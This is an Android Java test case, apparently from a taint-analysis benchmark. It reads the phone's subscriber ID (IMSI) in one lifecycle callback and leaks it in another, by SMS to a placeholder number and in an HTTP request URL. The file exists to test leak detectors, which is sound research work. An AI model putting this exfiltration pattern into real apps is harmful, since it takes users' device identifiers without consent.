package de.ecspride;

import android.app.Activity;
import android.content.Context;
import android.os.Bundle;
import android.os.StrictMode;
import android.telephony.SmsManager;
import android.telephony.TelephonyManager;
import android.util.Log;

import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.net.HttpURLConnection;
import java.net.URL;

/**
 * @testcase_name ActivityLifecycle3
 * @version 0.1
 * @author Secure Software Engineering Group (SSE), European Center for Security and Privacy by Design (EC SPRIDE) 
 * @author_mail siegfried.rasthofer@cased.de
 * 
 * @description The return value of source method is stored to a static variable in one callback method
 *  and sent to a sink in a different callback method
 * @dataflow onSaveInstanceState: source -> s; onRestoreInstanceState: s -> sink
 * @number_of_leaks 1
 * @challenges the analysis must be able to handle the activity lifecycle correctly,
 *  in particular the less common instanceState callbacks
 */
public class MainActivity extends Activity {
	public String s;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);

		if (android.os.Build.VERSION.SDK_INT > 9) {
			StrictMode.ThreadPolicy policy = new StrictMode.ThreadPolicy.Builder().permitAll().build();
			StrictMode.setThreadPolicy(policy);
		}
    }
    
    @Override
	public void onSaveInstanceState(Bundle outState){
		 TelephonyManager telephonyManager = (TelephonyManager) getSystemService(Context.TELEPHONY_SERVICE);
		s = telephonyManager.getSubscriberId(); //source
	}
	
	@Override 
	public void onRestoreInstanceState(Bundle outState){
		SmsManager sms = SmsManager.getDefault();
        sms.sendTextMessage("+49 1234", null, s, null, null); //sink, leak

		try {
			connect(s);
		} catch (Exception e) {
			e.printStackTrace();
		}
	}

	private void connect(String data) throws IOException {
		String URL = "http://www.google.de/search?q=";
		URL = URL.concat(data);
		java.net.URL url = new URL(URL);
		HttpURLConnection conn = (HttpURLConnection) url.openConnection(); //sink, leak
		conn.setRequestMethod("GET");
		conn.setDoInput(true);
		// Starts the query
		conn.connect();
		Log.d(getClass().getSimpleName(), URL);

		InputStream is = conn.getInputStream();
		if (is == null)
			return;
		StringBuilder sb = new StringBuilder();
		BufferedReader br = new BufferedReader(new InputStreamReader(is));
		String line = null;
		try {
			while ((line = br.readLine()) != null)
				sb.append(line);
		} finally {
			br.close();
			is.close();
		}
		Log.d(getClass().getSimpleName(), sb.toString());
	}
}
